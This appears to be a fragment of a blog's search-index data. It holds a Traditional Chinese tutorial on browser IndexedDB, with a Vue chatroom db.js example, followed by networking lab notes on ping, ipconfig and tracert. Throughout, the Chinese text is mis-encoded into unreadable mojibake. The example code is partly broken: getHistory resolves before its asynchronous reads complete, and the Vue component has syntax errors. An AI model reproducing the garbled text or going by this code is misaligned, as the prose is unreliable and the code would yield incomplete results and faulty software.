Ÿæœƒã€‚ äº¤æ˜“èƒ½æ”¶åˆ°ä¸‰ç¨®äº‹ä»¶: éŒ¯èª¤(error)ã€ä¸­æ–·(abort)ä»¥åŠå®Œæˆ(complete)ï¼Œå…¶ä¸­éŒ¯èª¤äº‹ä»¶æœƒå‘ä¸Šå‚³éï¼Œæ‰€ä»¥ä»»ä½•ä¸€å€‹äº¤æ˜“ä¸‹è½„çš„è«‹æ±‚ç”¢ç”ŸéŒ¯èª¤äº‹ä»¶ï¼Œè©²äº¤æ˜“éƒ½æœƒæ”¶åˆ°ã€‚å¦‚æœäº¤æ˜“æ”¶åˆ°éŒ¯èª¤äº‹ä»¶æ™‚ï¼Œç€è¦½å™¨é è¨­è¡Œç‚ºæœƒä¸­æ–·äº¤æ˜“ï¼Œé™¤éæˆ‘å€‘æœ‰åœ¨éŒ¯èª¤äº‹ä»¶ä¸Šå‘¼å«preventDefault()é˜»æ“‹ç€è¦½å™¨é è¨­è¡Œå‹•ï¼Œå¦å‰‡æ•´ç­†äº¤æ˜“éƒ½å°‡å–æ¶ˆã€å¾©åŸï¼Œé€™æ¨£çš„è¨­è¨ˆå‘Šè¨´æˆ‘å€‘å¿…é ˆè¦æ€è€ƒå¦‚ä½•è™•è£¡éŒ¯èª¤ï¼Œæˆ–è€…èªªå¦‚æœå°æ¯ä¸€å€‹éŒ¯èª¤é€²è¡Œè™•è£¡éæ–¼éº»ç…©ï¼Œé‚£éº¼è‡³å°‘åŠ å…¥ä¸€å€‹æ¦‚æ‹¬æ€§çš„éŒ¯èª¤è™•ç†å™¨ä¹Ÿæ˜¯å¯ä»¥ã€‚åªè¦ä¸è™•è£¡éŒ¯èª¤æˆ–å‘¼å«abort()ï¼Œäº¤æ˜“å°‡å–æ¶ˆã€å¾©åŸï¼Œç„¶å¾Œä¸­æ–·äº‹ä»¶æ¥è‘—è§¸ç™¼ï¼Œåä¹‹ï¼Œç•¶æ‰€æœ‰è«‹æ±‚éƒ½å®Œæˆå¾Œï¼Œæˆ‘å€‘æœƒæ”¶åˆ°ä¸€å€‹å®Œæˆäº‹ä»¶ï¼Œæ‰€ä»¥èªªå¦‚æœæˆ‘å€‘åŒæ™‚ç™¼èµ·å¤šé …è«‹æ±‚æ™‚ï¼Œå¯ä»¥åªè¿½è¹¤å–®ä¸€äº¤æ˜“è€Œéå€‹åˆ¥è«‹æ±‚ï¼Œé€™æ¨£æœƒå¤§å¤§æ¸›è¼•æˆ‘å€‘çš„è² æ“”ã€‚ æœ‰äº†äº¤æ˜“ä¹‹å¾Œä¾¿èƒ½å¤ å¾ä¸­å–å¾—ç‰©ä»¶å­˜æª”ï¼Œæœ‰äº†ç‰©ä»¶å­˜æª”ä¾¿èƒ½å¤ æ–°å¢è³‡æ–™(è«‹æ³¨æ„å”¯æœ‰åœ¨å»ºç«‹äº¤æ˜“æ™‚æŒ‡å®šçš„ç‰©ä»¶å­˜æª”èƒ½å¤ å–å¾—)ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // Do something when all the data is added to the database. transaction.oncomplete = function(event) { alert(\u0026#34;All done!\u0026#34;); }; transaction.onerror = function(event) { // Don\u0026#39;t forget to handle errors! }; var objectStore = transaction.objectStore(\u0026#34;customers\u0026#34;); for (var i in customerData) { var request = objectStore.add(customerData[i]); request.onsuccess = function(event) { // event.target.result == customerData[i].ssn; }; } å‘¼å« add() æ–¹æ³•å¯ä»¥åŠ å…¥ä¸€ç­†æ–°è³‡æ–™ï¼Œå‘¼å«å¾Œæœƒå›å‚³ä¸€å€‹IDBRequestç‰©ä»¶ï¼Œå³ç‚ºä¸Šæ–¹ç¯„ä¾‹ä¸­çš„requestï¼Œå¦‚æœæ–°å¢æˆåŠŸï¼Œrequestçš„æˆåŠŸäº‹ä»¶æœƒè¢«è§¸ç™¼ï¼Œè€ŒæˆåŠŸäº‹ä»¶ç‰©ä»¶ä¸­æœ‰ä¸€å€‹resultå±¬æ€§ï¼Œé€™å€‹resultå€¼å‰›å¥½å°±ç­‰æ–¼æ–°è³‡æ–™çš„è³‡æ–™éµï¼Œæ‰€ä»¥èªªä¸Šæ–¹ç¯„ä¾‹ä¸­çš„event.target.resultå‰›å¥½å°±ç­‰æ–¼é¡§å®¢çš„ssnå€¼(å› ç‚ºæˆ‘å€‘ç”¨ssnå±¬æ€§ä½œç‚ºè³‡æ–™éµè·¯å¾‘)ã€‚è«‹æ³¨æ„addæ–¹æ³•åªåœ¨ç•¶ç‰©ä»¶å­˜æª”ä¸­æ²’æœ‰ç›¸åŒè³‡æ–™éµè³‡æ–™å­˜åœ¨æ™‚æœ‰ç”¨ï¼Œå¦‚æœæƒ³è¦æ›´å‹•æˆ–æ˜¯ç›´æ¥è¦†è“‹ç¾å­˜è³‡æ–™è«‹å‘¼å«putæ–¹æ³•ã€‚ 5. ç§»é™¤è³‡æ–™ ç§»é™¤è³‡æ–™ååˆ†å®¹æ˜“ï¼š 1 2 3 4 var request = db.transaction([\u0026#34;customers\u0026#34;], \u0026#34;readwrite\u0026#34;).objectStore(\u0026#34;customers\u0026#34;).delete(\u0026#34;444-44-4444\u0026#34;); request.onsuccess = function(event) { // It\u0026#39;s gone! }; 6. è®€å–è³‡æ–™ è¦å–è³‡æ–™åº«å…§çš„è³‡æ–™æœ‰æ•¸ç¨®é€”å¾‘ï¼Œç¬¬ä¸€å€‹æœ€ç°¡å–®çš„é€”å¾‘å°±æ˜¯æä¾›è³‡æ–™éµï¼Œå‘¼å« get() æ–¹æ³•å–å¾—è³‡æ–™ï¼š 1 2 3 4 5 6 7 8 9 10 var transaction = db.transaction([\u0026#34;customers\u0026#34;]); var objectStore = transaction.objectStore(\u0026#34;customers\u0026#34;); var request = objectStore.get(\u0026#34;444-44-4444\u0026#34;); request.onerror = function(event) { // Handle errors! }; request.onsuccess = function(event) { // Do something with the request.result! alert(\u0026#34;Name for SSN 444-44-4444 is \u0026#34; + request.result.name); }; å‡è¨­æˆ‘å€‘æŠŠéŒ¯èª¤è™•ç†æ”¾åœ¨è³‡æ–™åº«å±¤ç´šï¼Œæˆ‘å€‘å¯ä»¥å†ç¸®çŸ­ä¸Šé¢çš„ç¨‹å¼ç¢¼å¦‚ä¸‹ï¼š 1 2 3 db.transaction(\u0026#34;customers\u0026#34;).objectStore(\u0026#34;customers\u0026#34;).get(\u0026#34;444-44-4444\u0026#34;).onsuccess = function(event) { alert(\u0026#34;Name for SSN 444-44-4444 is \u0026#34; + event.target.result.name); }; å‘¼å« transcation æ–¹æ³•è€Œä¸æŒ‡å®šæ¨¡å¼æœƒé–‹å•Ÿè®€å–(readonly)æ¨¡å¼ï¼Œæ¥è‘—å–å¾—æˆ‘å€‘çš„ç›®æ¨™ç‰©ä»¶å­˜æª”ï¼Œè¼¸å…¥ç›®æ¨™è³‡æ–™çš„è³‡æ–™éµï¼Œå‘¼å«getæ–¹æ³•å–å¾—è«‹æ±‚ç‰©ä»¶ï¼Œç„¶å¾Œåœ¨è«‹æ±‚ç‰©ä»¶ä¸Šè¨»å†ŠæˆåŠŸäº‹ä»¶è™•ç†å™¨ï¼Œç•¶ä½œæ¥­æˆåŠŸå¾Œï¼ŒæˆåŠŸäº‹ä»¶æœƒè§¸ç™¼ï¼ŒæˆåŠŸäº‹ä»¶çš„ç‰©ä»¶ä¸­å«æœ‰è«‹æ±‚ç‰©ä»¶(event.targetå¦‚ä¸Šè¿°ç¯„ä¾‹)ï¼Œè«‹æ±‚ç‰©ä»¶ä¸­å«æœ‰è«‹æ±‚çµæœ(event.target.resultå¦‚ä¸Šè¿°ç¯„ä¾‹)ã€‚ 7. ä½¿ç”¨æŒ‡æ¨™(Cursor) ä½¿ç”¨getæ–¹æ³•éœ€è¦çŸ¥é“è³‡æ–™éµï¼Œå¦‚æœæƒ³è¦ä¸€ä¸€å­˜å–ç‰©ä»¶å­˜æª”ä¸­çš„è³‡æ–™ï¼Œæˆ‘å€‘å¯ä»¥åˆ©ç”¨æŒ‡æ¨™ï¼š 1 2 3 4 5 6 7 8 9 10 11 var objectStore = db.transaction(\u0026#34;customers\u0026#34;).objectStore(\u0026#34;customers\u0026#34;); objectStore.openCursor().onsuccess = function(event) { var cursor = event.target.result; if (cursor) { alert(\u0026#34;Name for SSN \u0026#34; + cursor.key + \u0026#34; is \u0026#34; + cursor.value.name); cursor.continue(); } else { alert(\u0026#34;No more entries!\u0026#34;); } }; openCursor æ–¹æ³•ç¬¬ä¸€å€‹åƒæ•¸ç”¨ä¾†æ¥å—è³‡æ–™éµç¯„åœç‰©ä»¶ä¾†é™åˆ¶å­˜å–è³‡æ–™ç¯„åœï¼Œç¬¬äºŒå€‹åƒæ•¸ç”¨ä¾†æŒ‡å®šå­˜å–é€²è¡Œæ–¹å‘ï¼Œåƒä¸Šé¢çš„ç¯„ä¾‹ç¨‹å¼ä¾¿æ˜¯ä»¥è³‡æ–™éµç”±å°åˆ°å¤§ä¹‹æ–¹å‘å­˜å–è³‡æ–™ï¼›å‘¼å«openCursoræ–¹æ³•å¾Œä¸€æ¨£æœƒå›å‚³ä¸€å€‹è«‹æ±‚ç‰©ä»¶ï¼ŒæˆåŠŸæ™‚æˆåŠŸäº‹ä»¶æœƒè§¸ç™¼ï¼Œä¸éé€™è£¡æœ‰äº›åœ°æ–¹è¦ç‰¹åˆ¥æ³¨æ„ï¼Œç•¶æˆåŠŸäº‹ä»¶è™•è£¡å‡½æ•¸è¢«å–šèµ·æ™‚ï¼ŒæŒ‡æ¨™ç‰©ä»¶(cursor)æœƒå­˜æ”¾åœ¨resultå±¬æ€§å…§(äº¦å³ä¸Šè¿°event.target.result)ï¼Œcursorç‰©ä»¶ä¸‹æœ‰å…©å€‹å±¬æ€§ï¼Œkeyå±¬æ€§æ˜¯è³‡æ–™éµï¼Œvalueå±¬æ€§æ˜¯è³‡æ–™å€¼ï¼Œå¦‚æœè¦å–å¾—ä¸‹ä¸€ä»½è³‡æ–™å°±å‘¼å«cursorçš„continue()æ–¹æ³•ï¼Œç„¶å¾Œcursorç‰©ä»¶å°±æœƒæŒ‡å‘ä¸‹ä¸€ä»½è³‡æ–™ï¼Œç•¶æ²’æœ‰è³‡æ–™æ™‚ï¼Œcursoræœƒæ˜¯undefinedï¼Œç•¶è«‹æ±‚ä¸€é–‹å§‹ä¾¿æ‰¾æ²’æœ‰è³‡æ–™ï¼Œresultå±¬æ€§ä¹Ÿæœƒæ˜¯undefinedã€‚ ä»¥ä¸‹ç”¨cursorå­˜å–ä¸€éè³‡æ–™å¾Œæ”¾åœ¨é™£åˆ—ä¸­çš„ä½œæ³•ç›¸ç•¶å¸¸è¦‹ï¼š 1 2 3 4 5 6 7 8 9 10 11 var customers = []; objectStore.openCursor().onsuccess = function(event) { var cursor = event.target.result; if (cursor) { customers.push(cursor.value); cursor.continue(); } else { alert(\u0026#34;Got all customers: \u0026#34; + customers); } }; Warning: ä»¥ä¸‹ç¯„ä¾‹ä¸æ˜¯IndexedDBæ¨™æº–!\nMozillaç€è¦½å™¨è‡ªå·±åšäº†ä¸€å€‹ getAll() æ–¹æ³•ä¾†æ–¹ä¾¿ä¸€æ¬¡å–å¾—æ‰€æœ‰cursorä¸‹çš„è³‡æ–™å€¼ï¼Œé€™å€‹æ–¹æ³•ç›¸ç•¶æ–¹ä¾¿ï¼Œä¸éè«‹å°å¿ƒæœªä¾†å®ƒæœ‰å¯èƒ½æœƒæ¶ˆå¤±ã€‚ä»¥ä¸‹ç¨‹å¼ç¢¼çš„æ•ˆæœå’Œä¸Šé¢çš„ä¸€æ¨£ï¼š 1 2 3 objectStore.getAll().onsuccess = function(event) { alert(\u0026#34;Got all customers: \u0026#34; + event.target.result); }; ä¸€ä¸€æª¢æŸ¥cursorçš„valueå±¬æ€§è¼ƒä¸åˆ©æ€§èƒ½è¡¨ç¾ï¼Œå› ç‚ºç‰©ä»¶æ˜¯è¢«å‹•ä¸€ä¸€å»ºç«‹ï¼Œç„¶è€Œå‘¼å« getAll()ï¼ŒGeckoä¸€å®šè¦ä¸€æ¬¡å»ºç«‹æ‰€æœ‰ç‰©ä»¶ï¼Œæ‰€ä»¥å¦‚æœæƒ³è¦ä¸€æ¬¡å–å¾—æ‰€æœ‰ç‰©ä»¶çš„è³‡æ–™å€¼é™£åˆ—ä½¿ç”¨ getAll() æ¯”è¼ƒå¥½ï¼Œå¦‚æœæƒ³è¦ä¸€ä¸€æª¢æŸ¥æ¯ç­†è³‡æ–™å‰‡è«‹åˆ©ç”¨cursorçš„æ–¹æ³•ã€‚ 8. ä½¿ç”¨ç´¢å¼• åˆ©ç”¨ä¸€å®šå”¯ä¸€çš„ssnç¢¼ä½œç‚ºè³‡æ–™éµç›¸ç•¶åˆä¹é‚è¼¯(éš±ç§æ¬Šçš„å•é¡Œå…ˆæ“±ç½®ä¸€æ”¾ï¼Œä¸åœ¨æœ¬æ–‡æ¢è¨ç¯„åœ)ã€‚ä¸éç•¶æˆ‘å€‘æƒ³è¦æŸ¥è©¢ä½¿ç”¨è€…çš„åå­—çš„æ™‚å€™ï¼Œå¦‚æœæ²’æœ‰ç´¢å¼•å°±éœ€è¦ä¸€ä¸€æª¢æŸ¥æ¯ä¸€ç­†è³‡æ–™ï¼Œååˆ†æ²’æœ‰æ•ˆç‡ï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥å»ºç«‹nameçš„ç´¢å¼•ã€‚ 1 2 3 4 var index = objectStore.index(\u0026#34;name\u0026#34;); index.get(\u0026#34;Donna\u0026#34;).onsuccess = function(event) { alert(\u0026#34;Donna\u0026#39;s SSN is \u0026#34; + event.target.result.ssn); }; å› ç‚º name ä¸æ˜¯å”¯ä¸€å€¼ï¼Œæ‰€ä»¥å¯èƒ½æœƒæœ‰å¤šç­†è³‡æ–™ç¬¦åˆ\u0026quot;Donna\u0026quot;åå­—ï¼Œæ­¤æ™‚å‘¼å« get() æœƒå–å¾—è³‡æ–™éµæœ€å°å€¼çš„è³‡æ–™ã€‚ 9. è¨­å®šæŒ‡æ¨™æŸ¥è©¢ç¯„åœå’Œæ–¹å‘ å¦‚æœæƒ³è¦é™å®šæŒ‡æ¨™æŸ¥è©¢ç¯„åœï¼Œé‚£éº¼åœ¨ä¹å« openCursor() æˆ– openKeyCursor() æ™‚ç¬¬ä¸€å€‹åƒæ•¸è¦å‚³å…¥ IDBKeyRange ç‰©ä»¶ä»¥é™åˆ¶ç¯„åœã€‚IDBKeyRangeç‰©ä»¶èƒ½å¤ åªèšç„¦åœ¨å–®ä¸€è³‡æ–™éµä¸Šæˆ–è€…ä¸€æ®µä¸Šä¸‹é™å€é–“ï¼›ä¸Šä¸‹é™å€é–“å¯ä»¥æ˜¯å°é–‰(å«ç•Œé™)æˆ–é–‹æ”¾(ä¸å«ç•Œé™)ï¼Œè«‹çœ‹ä»¥ä¸‹ç¯„ä¾‹ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // Only match \u0026#34;Donna\u0026#34; var singleKeyRange = IDBKeyRange.only(\u0026#34;Donna\u0026#34;); // Match anything past \u0026#34;Bill\u0026#34;, including \u0026#34;Bill\u0026#34; var lowerBoundKeyRange = IDBKeyRange.lowerBound(\u0026#34;Bill\u0026#34;); // Match anything past \u0026#34;Bill\u0026#34;, but don\u0026#39;t include \u0026#34;Bill\u0026#34; var lowerBoundOpenKeyRange = IDBKeyRange.lowerBound(\u0026#34;Bill\u0026#34;, true); // Match anything up to, but not including, \u0026#34;Donna\u0026#34; var upperBoundOpenKeyRange = IDBKeyRange.upperBound(\u0026#34;Donna\u0026#34;, true); // Match anything between \u0026#34;Bill\u0026#34; and \u0026#34;Donna\u0026#34;, but not including \u0026#34;Donna\u0026#34; var boundKeyRange = IDBKeyRange.bound(\u0026#34;Bill\u0026#34;, \u0026#34;Donna\u0026#34;, false, true); index.openCursor(boundKeyRange).onsuccess = function(event) { var cursor = event.target.result; if (cursor) { // Do something with the matches. cursor.continue(); } }; æœ‰æ™‚å€™æˆ‘å€‘æœƒæƒ³è¦ç”±å¤§åˆ°å°æŸ¥çœ‹è³‡æ–™è€Œéé è¨­ç”±å°åˆ°å¤§æ–¹å‘ï¼Œå‚³å…¥ç¬¬äºŒå€‹\u0026quot;prev\u0026quot;å­—ä¸²ä¾¿èƒ½åšåˆ°ï¼š 1 2 3 4 5 6 7 objectStore.openCursor(null, \u0026#34;prev\u0026#34;).onsuccess = function(event) { var cursor = event.target.result; if (cursor) { // Do something with the entries. cursor.continue(); } }; ç”±æ–¼\u0026quot;name\u0026quot;ç´¢å¼•ä¸å…·å”¯ä¸€æ€§ï¼Œæ‰€ä»¥ä¸€å€‹åå­—ä¸‹å¯èƒ½æœƒå‡ºç¾å¤šç­†è³‡æ–™ï¼Œæ­¤æ™‚å¦‚æœæƒ³è¦é¿é–‹é€™å¤šç­†è³‡æ–™ï¼Œè«‹å‚³å…¥\u0026quot;nextunique\u0026quot;æˆ–\u0026quot;prevunique\u0026quot;åšç‚ºç¬¬äºŒå€‹æ–¹å‘åƒæ•¸ï¼Œç•¶å‚³å…¥ä¹‹å¾Œï¼Œå¦‚ä¸€å€‹åå­—ä¸‹é‡åˆ°å¤šç­†è³‡æ–™ï¼Œå‰‡åªæœ‰è³‡æ–™éµæœ€å°çš„è³‡æ–™æœƒè¢«å›å‚³ã€‚ 1 2 3 4 5 6 7 index.openKeyCursor(null, \u0026#34;nextunique\u0026#34;).onsuccess = function(event) { var cursor = event.target.result; if (cursor) { // Do something with the entries. cursor.continue(); } }; é—œæ–¼å¯å‚³å…¥çš„æ–¹å‘åƒæ•¸ï¼Œè«‹åƒè€ƒIDBCursorå¸¸æ•¸ã€‚\nå®‰å…¨æ€§ IndexedDBéµå®ˆåŒæºæ”¿ç­–ï¼Œæ‰€ä»¥å®ƒç¶å®šå‰µå»ºå®ƒçš„ä¾†æºç¶²ç«™ï¼Œå…¶ä»–ä¾†æºç¶²ç«™ç„¡æ³•å­˜å–ã€‚ å°±åƒå°è¼‰å…¥ \u0026lt;frame\u0026gt; å’Œ \u0026lt;iframe\u0026gt; ç¶²é çš„ç¬¬ä¸‰æ–¹cookieæ‰€è¨­ä¸‹çš„å®‰å…¨æ€§å’Œéš±ç§æ¬Šè€ƒé‡é™åˆ¶ï¼ŒIndexedDBç„¡æ³•åœ¨è¼‰å…¥ \u0026lt;frame\u0026gt; å’Œ \u0026lt;iframe\u0026gt; ç¶²é ä¸Šé‹ä½œï¼Œè©³æƒ…è«‹è¦‹ bug 595307ã€‚ ç€è¦½å™¨é—œé–‰é¢¨éšª ç•¶ç€è¦½å™¨é—œé–‰ï¼Œä¾‹å¦‚ä½¿ç”¨è€…æŒ‰ä¸‹é—œé–‰éˆ•ï¼Œä»»ä½•æœªå®ŒæˆIndexedDBäº¤æ˜“éƒ½å°‡é»˜é»˜ä¸­æ­¢ï¼Œé€™äº›äº¤æ˜“ä¸æœƒå®Œæˆï¼ŒéŒ¯èª¤äº‹ä»¶ä¹Ÿä¸æœƒè§¸ç™¼ã€‚æ—¢ç„¶ç€è¦½å™¨å¯èƒ½éš¨æ™‚è¢«é—œé–‰ï¼Œæˆ‘å€‘ç„¡æ³•å®Œå…¨æŒ‡æœ›ä»»ä½•ç‰¹å®šäº¤æ˜“ä¸€å®šæœƒå®Œæˆï¼Œæˆ–æ˜¯ä¾è³´éŒ¯èª¤äº‹ä»¶åšå‡ºç›¸æ‡‰è™•ç†ï¼Œé‡å°é€™ç¨®ç‹€æ³ï¼Œæˆ‘å€‘éœ€è¦æ³¨æ„ï¼š æ¯ä¸€ç­†äº¤æ˜“çµæŸå¾Œéƒ½æ‡‰è©²è¦ä¿æŒè³‡æ–™åº«å®Œæ•´æ€§ï¼Œä¾‹å¦‚èªªï¼Œæœ‰ä¸€ä¸²ä½¿ç”¨è€…ç·¨è¼¯é …ç›®æ¸…å–®æ­£è¦å­˜å…¥è³‡æ–™åº«ï¼Œæˆ‘å€‘å¦‚æœå…ˆåœ¨ä¸€å€‹äº¤æ˜“ä¸­æ¸…é™¤èˆŠæ¸…å–®ï¼Œç„¶å¾Œåœ¨å¦ä¸€å€‹äº¤æ˜“ä¸­å­˜å…¥æ–°æ¸…å–®ï¼Œé‚£å°±æœƒé¢è‡¨åˆ°æ¸…é™¤å®Œå°±æ¸…å–®å¾Œï¼Œæ–°æ¸…å–®å­˜å…¥äº¤æ˜“é‚„ä¾†ä¸åŠå›å­˜ï¼Œç€è¦½å™¨å°±é—œé–‰çš„é¢¨éšªï¼Œè€Œé€™å€‹æ™‚å€™è³‡æ–™åº«è£¡é¢çš„æ¸…å–®è³‡æ–™å°‡æ¶ˆå¤±ã€‚æ‰€ä»¥æ¯”è¼ƒå¥½çš„åšæ³•æ‡‰è©²æ˜¯åœ¨åŒä¸€ç­†äº¤æ˜“ä¸­å®Œæˆæ¸…é™¤èˆŠæ¸…å–®å’Œå­˜å…¥æ–°æ¸…å–®ã€‚ æ°¸é ä¸è¦åœ¨unloadäº‹ä»¶ä¸­åŸ·è¡Œè³‡æ–™åº«äº¤æ˜“ï¼Œå› ç‚ºå¦‚æœunloadäº‹ä»¶æ˜¯è§¸ç™¼åœ¨ç€è¦½å™¨é—œé–‰ä¸‹ï¼Œä»»ä½•è³‡æ–™åº«äº¤æ˜“éƒ½ä¸æœƒç™¼ç”Ÿï¼Œæˆ–è¨±ï¼Œç€è¦½å™¨(æˆ–åˆ†é )æ‰“é–‹æ™‚è®€å–è³‡æ–™åº«ï¼Œæ›´æ–°è³‡æ–™åº«ç•¶ä½¿ç”¨è€…ç·¨è¼¯è³‡æ–™ï¼Œç•¶ç€è¦½å™¨(æˆ–åˆ†é )é—œé–‰æ™‚å„²å­˜è³‡æ–™é€™æ¨£çš„åšæ³•æ¯”è¼ƒç›´è¦ºï¼Œä¸éè³‡æ–™åº«çš„æ“ä½œæ˜¯éåŒæ­¥é€²è¡Œåœ°ï¼Œæ‰€ä»¥ç€è¦½å™¨é—œé–‰çš„åŸ·è¡Œæœƒåœ¨è³‡æ–™åº«æ“ä½œå‰ç™¼ç”Ÿï¼Œé€²è€Œä¸­æ–·å¾ŒçºŒéåŒæ­¥çš„è³‡æ–™åº«äº¤æ˜“ï¼Œæ‰€ä»¥åœ¨unloadäº‹ä»¶ä¸­åŸ·è¡Œè³‡æ–™åº«äº¤æ˜“æ˜¯è¡Œä¸é€šåœ°ã€‚ äº‹å¯¦ä¸Šä¸è«–ç€è¦½å™¨æ˜¯å¦æ­£å¸¸é—œé–‰ï¼Œéƒ½æ²’æœ‰ä»»ä½•æ–¹æ³•ä¿è­‰IndexedDBäº¤æ˜“èƒ½å¤ é †åˆ©å®Œæˆï¼Œè«‹è¦‹ bug 870645ã€‚ ç¯„ä¾‹ç·´ç¿’ï¼šå°‡èŠå¤©å®¤æ¨æ’­è¨Šæ¯å¯«é€² IndexedDB å»ºç«‹db.jsï¼Œä¸¦å°‡æ“ä½œ IndexedDB æ•´åˆè‡³æª”æ¡ˆä¸­ã€‚ vueæª”å¼•å…¥db.jsï¼Œä¸¦ä¸€æ¬¡åƒ…æ’ˆæœ€æ–°50ç­†è³‡æ–™ã€‚ db.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 // å›å‚³æ˜¯å¦æ”¯æ´ IndexedDB export function isSupportDB() { const indexedDB = window.indexedDB || window.webkitIndexedDB || window.mozIndexedDB || window.msIndexedDB return !!indexedDB } // æ‰“é–‹orå»ºç«‹DB export function openDB() { return new Promise((resolve, reject) =\u0026gt; { const request = indexedDB.open(\u0026#34;ChatDB\u0026#34;) // æ‰“é–‹orå»ºç«‹èŠå¤©å®¤DB request.onerror = e =\u0026gt; { console.log(\u0026#34;idb create fail\u0026#34;) reject(e) } request.onsuccess = () =\u0026gt; { console.log(\u0026#34;idb create success\u0026#34;) DBObject = request.result resolve(DBObject) // æˆåŠŸå¾Œè¿”å›DBç‰©ä»¶ } request.onupgradeneeded = e =\u0026gt; { // è‹¥ç‰ˆæœ¬å·²å‡ç´šå‰‡é‡æ–°å»ºç«‹DBç‰©ä»¶ï¼Œä¸¦è¿”å›DBç‰©ä»¶ DBObject = e.target.result DBObject.createObjectStore(\u0026#34;chatData\u0026#34;, { keyPath: \u0026#34;index\u0026#34;, autoIncrement: true }) resolve(DBObject) } }) } // å–æ­·å²èŠå¤©ç´€éŒ„æœ€æ–°50ç­† export function getHistory(num) { return new Promise(resolve =\u0026gt; { const objectStore = DBObject.transaction([\u0026#34;chatData\u0026#34;], \u0026#34;readonly\u0026#34;).objectStore(\u0026#34;chatData\u0026#34;) let getKey = objectStore.getAllKeys() getKey.onsuccess = () =\u0026gt; { let result = [] for (let i = getKey.result.length - num * 50 - 1; i \u0026gt; getKey.result.length - num * 50 - 50 - 1; i--) { let getItem = objectStore.get(getKey.result[i]) getItem.onsuccess = () =\u0026gt; { result.unshift(getItem.result) } } resolve(result) } // ä¸€æ¬¡æ’ˆå…¨éƒ¨è³‡æ–™ // const request = DBObject.transaction([\u0026#34;chatData\u0026#34;], \u0026#34;readonly\u0026#34;).objectStore(\u0026#34;chatData\u0026#34;).getAll() // request.onsuccess = () =\u0026gt; { // resolve(request.result) // } }) } // æ”¶åˆ°æ¨æ’­å°‡è¨Šæ¯å¯«å…¥idb export function addToDB(data) { const request = DBObject.transaction([\u0026#34;chatData\u0026#34;], \u0026#34;readwrite\u0026#34;) request.objectStore(\u0026#34;chatData\u0026#34;).add(data) //æ•°æ®å†™å…¥æˆåŠŸçš„å›è°ƒ request.onsuccess = () =\u0026gt; {} request.onerror = event =\u0026gt; { console.log(event) } } // æ¸…é™¤idbèŠå¤©ç´€éŒ„ export function clearDB() { const request = DBObject.transaction([\u0026#34;chatData\u0026#34;], \u0026#34;readwrite\u0026#34;) request.objectStore(\u0026#34;chatData\u0026#34;).clear() } chatroom.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 ... \u0026lt;script\u0026gt; import * as idb from \u0026#34;@/utils/db\u0026#34; export default { data: { return { msgData: [], historyRange: 0 } } mounted() { setTimeout(() =\u0026gt; { this.getHistory(this.historyRange) }, 500) } methods: { getHistory(num) { if (idb.isSupportDB()) { // è‹¥æ”¯æ´å‰‡é–‹å•ŸDBï¼Œä¸¦å¾…å›å‚³å¾Œæ’ˆè³‡æ–™ idb.openDB().then(() =\u0026gt; { idb.getHistory(num).then(result =\u0026gt; { setTimeout(() =\u0026gt; { if (!this.msgData.length) { // æœªæœ‰è³‡æ–™æ™‚ç›´æ¥å®šç¾© this.msgData = result } else { result.forEach(item =\u0026gt; { // å°‡æ’ˆåˆ°çš„è³‡æ–™ç”±å‰å¡å…¥msgData this.msgData.unshift(item) }) } this.historyRange++ }, 0) }) }) } }, add(data) { idb.addToDB(data) }, clearDB() { idb.clearDB() } } } \u0026lt;/script\u0026gt; ","date":"2022-09-12T00:00:00Z","image":"https://live.staticflickr.com/65535/52351840670_d321f7cc15_o.jpg","permalink":"https://wayneblog.ga/2022-09-12/use-indexeddb/","title":"å‰ç«¯ç·©å­˜å¤§ç­†è³‡æ–™ï¼šIndexedDB ä»‹ç´¹/æ‡‰ç”¨"},{"content":" æŒ‡å°æ•™å¸«ï¼šé»ƒå¨èªŒ ä½¿ç”¨è»Ÿé«” Cisco Packet Tracer Ciscoå®˜æ–¹ç¶²è·¯æ¨¡æ“¬å™¨ CPTä¸‹è¼‰æ•™å­¸\nwireshark(3.6.0) å°åŒ…æ“·å–å·¥å…· ä¸‹è¼‰wireshark\nVmware è™›æ“¬æ©Ÿè»Ÿé«” ä¸‹è¼‰Vmware\næŒ‡ä»¤ç­†è¨˜ ping 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ### å¸¸ç”¨ä¾†æ¸¬è©¦çš„ip ### ä¸­è¯é›»ä¿¡DNS ping 168.95.1.1 ### Google ping 8.8.8.8 \u0026gt;\u0026gt;\u0026gt; å›è¦†è‡ª [IP]: ä½å…ƒçµ„=32 æ™‚é–“=7ms TTL=245 \u0026gt;\u0026gt;\u0026gt; å›è¦†è‡ª [IP]: ä½å…ƒçµ„=32 æ™‚é–“=7ms TTL=245 \u0026gt;\u0026gt;\u0026gt; å›è¦†è‡ª [IP]: ä½å…ƒçµ„=32 æ™‚é–“=7ms TTL=245 \u0026gt;\u0026gt;\u0026gt; å›è¦†è‡ª [IP]: ä½å…ƒçµ„=32 æ™‚é–“=7ms TTL=245 æ™‚é–“: è‹¥é€£çºŒè¶…é100msï¼Œä»£è¡¨ç¶²è·¯æœ‰å•é¡Œ TTL: Time to live ipconfig æŸ¥è©¢é›»è…¦ç¶²å¡è¨­å®š ipconfig(Windows) / ifconfig(Linux/UNIX) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ### åŸºæœ¬ä½¿ç”¨ ipconfig ### æ›´è©³ç´°ç‰ˆæœ¬ ipconfig /all ### æŸ¥è©¢åƒæ•¸ ipconfig /? ### é‡‹æ”¾IPä½å€ ipconfig /release # IPv4 ipconfig /release6 # IPv6 ### é‡æ–°å–å¾—IPä½å€ (æœƒé€ æˆç¬é–“æ–·ç·š) ipconfig /renew # IPv4 ipconfig /renew6 # IPv6 ### æ¸…é™¤DNSå¿«å– ipconfig /flushdns tracert è¿½è¹¤é€£ç·šå‡ºå»çš„ç¯€é» æœ€å¤š30å€‹ç¯€é» 1 2 3 4 tracert 168.95.1.1 ### 